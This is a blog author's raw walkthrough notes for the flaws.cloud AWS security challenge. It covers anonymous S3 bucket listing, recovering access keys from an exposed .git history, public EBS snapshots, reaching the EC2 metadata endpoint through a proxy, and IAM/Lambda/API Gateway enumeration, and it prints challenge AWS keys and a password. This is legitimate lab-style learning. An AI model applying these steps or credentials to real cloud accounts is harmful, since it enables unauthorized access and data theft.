---
layout: post
title: "Cloud Security - AWS - Flaws 1"
description: "My notes of Flaws[flaws.cloud] which is focused on AWS."
thumb_image: "documentation/flawsthumb.png"
tags: [ cloudsecurity, sorcery ]
---

{% include image.html path="documentation/flaws.png"
path-detail="documentation/flaws.png"
alt="Flaws" %}

## Flaws

URL - http://flaws.cloud

### Disclamer

I am `no expert` in cloud security and starting it with Flaws, this blog is mainly `my notes` for the solutions of flaws.cloud, The flaws.cloud already have complete solutions in hints so you can simply follow along them if you are looking for solutions, this blog is mainly for me to quickly go through any of these `concepts` if I need them later, but if this helps any of you too, feel free to read and `share` them :D

_Below are my notes, they are completely raw without any editing to make them presentable, might also just have screenshots of challenge solutions which i wasn't able to solve due to resource limitation[I don't have a AWS account]._

### Level 1

{% include image.html path="documentation/Pasted image 20211022120406.png"
path-detail="documentation/Pasted image 20211022120406.png"
alt="Level 1" %}

Alright so, `S3` buckets can be used to host a static site and the cool thing is, the name of the bucket should be same as the domain name of the website.

And `S3` buckets names are unique so in case i have a s3 bucket named `amazon.com`, amazon can't create same bucket/host his website using the s3 bucket.

Finding out the s3 info from a site,

1st - `Dig it up` to find the actual IP address
{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ dig flaws.cloud

; <<>> DiG 9.16.15-Debian <<>> flaws.cloud
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 30624
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1280
;; QUESTION SECTION:
;flaws.cloud.                   IN      A

;; ANSWER SECTION:
flaws.cloud.            5       IN      A       52.218.169.58

;; Query time: 27 msec
;; SERVER: 192.168.119.2#53(192.168.119.2)
;; WHEN: Fri Oct 22 12:09:43 EDT 2021
;; MSG SIZE  rcvd: 56
{% endhighlight %}

2nd - Use `nslookup` to find the domain name
{% highlight bash %}  
┌──(fumenoid㉿kali)-[~]
└─$ nslookup 52.218.169.58                   
58.169.218.52.in-addr.arpa      name = s3-website-us-west-2.amazonaws.com.

Authoritative answers can be found from:
{% endhighlight %}

We can conclude from this that the `S3 bucket` is used to host the website and it is hosted from a server in `us-west-2`. 

As the name of bucket should be same as the domain, so bucket name is flaws.cloud and we can reach the same website using the url - `https://flaws.cloud.s3-website-us-west-3.amazonaws.com` 

{% include image.html path="documentation/Pasted image 20211022121946.png"
path-detail="documentation/Pasted image 20211022121946.png"
alt="Level 1" %}

Alright now let's check if the bucket is configured insecurily.

{% highlight bash %}
sudo apt install awscli
{% endhighlight %}

`CLI` to read files
{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ aws s3 ls s3://flaws.cloud --recursive --no-sign-request
2017-03-13 23:00:38       2575 hint1.html
2017-03-02 23:05:17       1707 hint2.html
2017-03-02 23:05:11       1101 hint3.html
2020-05-22 14:16:45       3162 index.html
2018-07-10 12:47:16      15979 logo.png
2017-02-26 20:59:28         46 robots.txt
2017-02-26 20:59:30       1051 secret-dd02c7c.html
{% endhighlight %}

Alternatively, we can also navigate to `https://flaws.cloud.s3.amazonaws.com`.

{% include image.html path="documentation/Pasted image 20211022141723.png"
path-detail="documentation/Pasted image 20211022141723.png"
alt="Level 1" %}

Readin files, both web and cli

`Web` - bucketname.s3.amazonaws.com/key

{% include image.html path="documentation/Pasted image 20211022141837.png"
path-detail="documentation/Pasted image 20211022141837.png"
alt="Level 1" %}

`CLI` - cp the file to stdout and use --no-sign-request as we don't have keys to sign in anyway.
{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ aws s3 cp s3://flaws.cloud/secret-dd02c7c.html - --no-sign-request                                                                                                                  255 ⨯
<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
            :not(center) > pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000; 
            border-width: 1px; border-style: solid;} 
        </style>
    </head>
<body 
  text="#00d000" 
  bgcolor="#000000"  
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
    
<center>
<pre >
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>


Level 2 is at <a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</a>                                   
{% endhighlight %}

#### Level 1 - Summarized
By default `S3 buckets` are secure and this problem doesn't arise unless a user mess up the `perms`.

{% include image.html path="documentation/Pasted image 20211023031833.png"
path-detail="documentation/Pasted image 20211023031833.png"
alt="Level 1" %}

### Level 2

{% include image.html path="documentation/Pasted image 20211023032029.png"
path-detail="documentation/Pasted image 20211023032029.png"
alt="Level 2" %}

1- Let's `Dig it up`
{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ dig level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud 

; <<>> DiG 9.16.15-Debian <<>> level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 29628
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1280
;; QUESTION SECTION:
;level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud. IN        A

;; ANSWER SECTION:
level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud. 5 IN A 52.218.182.130

;; Query time: 52 msec
;; SERVER: 192.168.119.2#53(192.168.119.2)
;; WHEN: Sat Oct 23 03:21:51 EDT 2021
;; MSG SIZE  rcvd: 96
{% endhighlight %}

2- `Nslookup` to find if it's a AWS s3 bucket
{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ nslookup 52.218.182.130
130.182.218.52.in-addr.arpa     name = s3-website-us-west-2.amazonaws.com.

Authoritative answers can be found from:
{% endhighlight %}

As it's a static site hosted on s3 bucket, the bucket name should be equal to the domain/subdomain name, hence we can go to `http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com/` to access the bucket but

{% include image.html path="documentation/Pasted image 20211023032557.png"
path-detail="documentation/Pasted image 20211023032557.png"
alt="Level 2" %}

Seems like it is secured this time, lets try `CLI`

{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --no-sign-request

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
{% endhighlight %}

Hint 1, we said we need our own AWS account for this.. hmm, guess we might really need one : /

welp fuck.. 

Configuring AWS profile
{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ aws configure                                                                  
AWS Access Key ID [None]: [Redacted]
AWS Secret Access Key [None]: [Redacted]
Default region name [None]: 
Default output format [None]: 
{% endhighlight %}

Now attempting to read the content of `s3 bucket` with our keys, not really sure how it works but will read the summary properly

{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile default
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html
{% endhighlight %}

Reading the secret file - `CLI`
{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ aws s3 cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html - --profile default
<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
            :not(center) > pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000; 
            border-width: 1px; border-style: solid;} 
        </style>
    </head>
<body 
  text="#00d000" 
  bgcolor="#000000"  
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
    
<center>
<pre >
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>


Level 3 is at <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</a>                                   
{% endhighlight %}

Web, by navigating to that webpage

{% include image.html path="documentation/Pasted image 20211023044409.png"
path-detail="documentation/Pasted image 20211023044409.png"
alt="Level 2" %}

#### Level 2 - Summarized

There was a setting to allow any AWS user to access a bucket, this setting can't be added via IAM now but `SDKs` and `third parties tools` may allow it, hence worth checking.

{% include image.html path="documentation/Pasted image 20211023044543.png"
path-detail="documentation/Pasted image 20211023044543.png"
alt="Level 2" %}


### Level 3

{% include image.html path="documentation/Pasted image 20211023044823.png"
path-detail="documentation/Pasted image 20211023044823.png"
alt="Level 3" %}

Again using `dig` and `nslookup` to confirm this website is hosted on s3 bucket.

{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ dig level3-9afd3927f195e10225021a578e6f78df.flaws.cloud 

; <<>> DiG 9.16.15-Debian <<>> level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 4993
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1280
;; QUESTION SECTION:
;level3-9afd3927f195e10225021a578e6f78df.flaws.cloud. IN        A

;; ANSWER SECTION:
level3-9afd3927f195e10225021a578e6f78df.flaws.cloud. 5 IN A 52.218.153.50

;; Query time: 20 msec
;; SERVER: 192.168.119.2#53(192.168.119.2)
;; WHEN: Sat Oct 23 04:51:29 EDT 2021
;; MSG SIZE  rcvd: 96
         
┌──(fumenoid㉿kali)-[~]
└─$ nslookup 52.218.153.50 
50.153.218.52.in-addr.arpa      name = s3-website-us-west-2.amazonaws.com.

Authoritative answers can be found from:
{% endhighlight %}

Woaw I can read the bucket

{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --no-sign-request
                           PRE .git/
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt
{% endhighlight %}

also there is a `.GIT` hmmm, let's download the whole bucket

{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud/FLaws3]
└─$ aws s3 cp s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --recursive
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/post-update.sample to .git/hooks/post-update.sample
[Redacted]
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png to ./authenticated_users.png
{% endhighlight %}

`git log` and `git show` to find the access keys.

{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud/FLaws3]
└─$ git show f52ec03b227ea6094b04e43f475fb0126edb5a61
commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit

diff --git a/access_keys.txt b/access_keys.txt
new file mode 100644
index 0000000..e3ae6dd
--- /dev/null
+++ b/access_keys.txt
@@ -0,0 +1,2 @@
+access_key AKIAJ366LIPB4IJKT7SA
+secret_access_key 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
{% endhighlight %}

also we got the older file, Switching back to the older commit

{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud/FLaws3]
└─$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
M       index.html
Note: switching to 'f52ec03b227ea6094b04e43f475fb0126edb5a61'.
[Redacted]
{% endhighlight %}

reading keys and next level path

{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud/FLaws3]
└─$ cat access_keys.txt 
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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

┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud/FLaws3]
└─$ cat hint4.html     
<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
            :not(center) > pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000; 
            border-width: 1px; border-style: solid;} 
        </style>
    </head>
<body 
  text="#00d000" 
  bgcolor="#000000"  
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
    
<center>
<pre >
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Level 3: Hint 4</h1>
</center>

The next level is at <a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud</a>
{% endhighlight %}

Listing all `s3 buckets` with these access keys

{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud/FLaws3]
└─$ aws s3 ls --profile flaws                                                                          
2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 12:34:53 config-bucket-975426262029
2017-02-12 15:03:24 flaws-logs
2017-02-04 22:40:07 flaws.cloud
2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
{% endhighlight %}

#### Level 3 - Summarized

{% include image.html path="documentation/Pasted image 20211023051108.png"
path-detail="documentation/Pasted image 20211023051108.png"
alt="Level 3" %}

Always roll the secret keys, `always.. !`

### Level 4

{% include image.html path="documentation/Pasted image 20211023051256.png"
path-detail="documentation/Pasted image 20211023051256.png"
alt="Level 4" %}

Hmm.. finally we are getting to `EC2` eh.. 

{% include image.html path="documentation/Pasted image 20211023051345.png"
path-detail="documentation/Pasted image 20211023051345.png"
alt="Level 4" %}

I cee, the challenge is to login, I am not entirely sure if this is a pure blackbox challenge or can we use the keys we got from previous challenge, for now lemme list the ec2

`I can't ;-;`

Also ffs, there are so many subcommands for EC2, I am totally clueless.. _hint ;-;_

{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ dig 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

; <<>> DiG 9.16.15-Debian <<>> 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25643
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1280
;; QUESTION SECTION:
;4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. IN A

;; ANSWER SECTION:
4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. 5 IN CNAME ec2-35-165-182-7.us-west-2.compute.amazonaws.com.
ec2-35-165-182-7.us-west-2.compute.amazonaws.com. 5 IN A 35.165.182.7

;; Query time: 20 msec
;; SERVER: 192.168.119.2#53(192.168.119.2)
;; WHEN: Sat Oct 23 09:32:49 EDT 2021
;; MSG SIZE  rcvd: 159
   
┌──(fumenoid㉿kali)-[~]
└─$ nslookup 35.165.182.7 
7.182.165.35.in-addr.arpa       name = ec2-35-165-182-7.us-west-2.compute.amazonaws.com.

Authoritative answers can be found from:
{% endhighlight %}

Welp so we know its an EC2 hosted in `us-west-2` and it has a snapshot which is publicably viewable

First we find account ID - 
{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ aws --profile flaws sts get-caller-identity
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
┌──(fumenoid㉿kali)-[~]
└─$ aws --profile flaws ec2 describe-snapshots --region=us-west-2                                                                                                                       255 ⨯
{
    "Snapshots": [
        {
            "Description": "snapshot of image.vmdk",
            "Encrypted": false,
            "OwnerId": "099720109477",
            "Progress": "100%",
            "SnapshotId": "snap-08089fd5a6e9f307a",
            "StartTime": "2018-04-23T16:28:08.000Z",
            "State": "completed",
            "VolumeId": "vol-ffffffff",
            "VolumeSize": 8
        },
                                [REDACTED]
                                [A lot of data since we didn't specified account ID while searching, are these the snapshots of other..idk]
                {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12.000Z",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ]
        }
    ]
}
{% endhighlight %}

Looking for snapshot after adding ID is simpler

{% highlight bash %}
┌──(fumenoid㉿kali)-[~]
└─$ aws --profile flaws ec2 describe-snapshots --region=us-west-2 --owner-id="975426262029"
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12.000Z",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ]
        }
    ]
}
{% endhighlight %}

Alright here it gets fun and complicated, we can create our own `EC2 instance` using that `snapshot ID`.

welp fuck I don't have perms kyuki card link nahi h .. lol, copying screenshots of steps from hints.. : (

{% include image.html path="documentation/Pasted image 20211023100414.png"
path-detail="documentation/Pasted image 20211023100414.png"
alt="Level 4" %}

{% include image.html path="documentation/Pasted image 20211023100451.png"
path-detail="documentation/Pasted image 20211023100451.png"
alt="Level 4" %}

`flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M`

{% include image.html path="documentation/Pasted image 20211023100544.png"
path-detail="documentation/Pasted image 20211023100544.png"
alt="Level 4" %}


#### Level 4 - Summarized

{% include image.html path="documentation/Pasted image 20211023100824.png"
path-detail="documentation/Pasted image 20211023100824.png"
alt="Level 4" %}

### Level 5

{% include image.html path="documentation/Pasted image 20211023100902.png"
path-detail="documentation/Pasted image 20211023100902.png"
alt="Level 5" %}

We can use proxy to access internal metadata api of ec2, `169.254.169.254`

{% include image.html path="documentation/Pasted image 20211023101804.png"
path-detail="documentation/Pasted image 20211023101804.png"
alt="Level 5" %}

now we can add these creds to `~/.aws/credentials` and then use it to list and download FLaws6 bucket

{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud/Flaws5]
└─$ aws s3 cp s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ . --profile flaws2 --recursive
download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/index.html to ./index.html
download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint2.html to ddcc78ff/hint2.html
download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint1.html to ddcc78ff/hint1.html
download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/index.html to ddcc78ff/index.html
 
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud/Flaws5]
└─$ ls       
ddcc78ff  index.html
{% endhighlight %}

#### Level 5 - Summarized

{% include image.html path="documentation/Pasted image 20211023103042.png"
path-detail="documentation/Pasted image 20211023103042.png"
alt="Level 5" %}

### Level 6

{% include image.html path="documentation/Pasted image 20211023103541.png"
path-detail="documentation/Pasted image 20211023103541.png"
alt="Level 6" %}

Configuring AWS account for level 6
{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud]
└─$ aws configure --profile flaws3                                                                    
AWS Access Key ID [None]: AKIAJFQ6E7BY57Q3OBGA
AWS Secret Access Key [None]: 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
Default region name [None]: 
Default output format [None]: 
{% endhighlight %}

Geting user ID
{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud]
└─$ aws --profile flaws3 iam get-user
{
    "User": {
        "Path": "/",
        "UserName": "Level6",
        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
        "Arn": "arn:aws:iam::975426262029:user/Level6",
        "CreateDate": "2017-02-26T23:11:16Z"
    }
}
{% endhighlight %}

Reading attached user-policies to figure out a weakness
{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud]
└─$ aws --profile flaws3 iam list-attached-user-policies --user-name Level6
{
    "AttachedPolicies": [
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        },
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        },
        {
            "PolicyName": "AWSCompromisedKeyQuarantine",
            "PolicyArn": "arn:aws:iam::aws:policy/AWSCompromisedKeyQuarantine"
        }
    ]
}
{% endhighlight %}

As we know the ARN for the policy we can read it's version id
{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud]
└─$ aws --profile flaws3 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17Z",
        "UpdateDate": "2017-02-20T01:48:17Z",
        "Tags": []
    }
}
{% endhighlight %}

With both version id and ARN we can read the actual policy 
{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud]
└─$ aws --profile flaws3 iam get-policy-version  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4 
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17Z"
    }
}
{% endhighlight %}

This tells us that,we have ability to GET `arn:aws:apigateway:us-west-2::/restapis/*` some lamba function thingy.
Reading Lambda functions we have access to,

{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud]
└─$ aws --profile flaws3 lambda list-functions --region us-west-2                                                              
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ]
        }
    ]
}
{% endhighlight %}

We get the `Rest-api` id with 

{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud]
└─$ aws --profile flaws3 --region us-west-2 lambda get-policy --function-name Level6                                                                                                      2 ⨯
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
}
{% endhighlight %}

Id - `s33ppypa75`
At this point I am a bit unsure what i am doing as i haven't ever delt with restapi and lambda in AWS.

{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud]
└─$ aws --profile flaws3 --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": 1488155168,
            "lastUpdatedDate": 1488155168
        }
    ]
}
{% endhighlight %}

This tells us that stage name is Prod and hence now we can navigate to - [https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6](https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6) to execude the lambda function.

{% highlight bash %}
┌──(fumenoid㉿kali)-[~/Desktop/Fumenoid/Cloud]
└─$ curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6  
"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/" 
{% endhighlight %}

#### Level 6 summarized

{% include image.html path="documentation/Pasted image 20211023122744.png"
path-detail="documentation/Pasted image 20211023122744.png"
alt="Level 6" %}


###### Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.

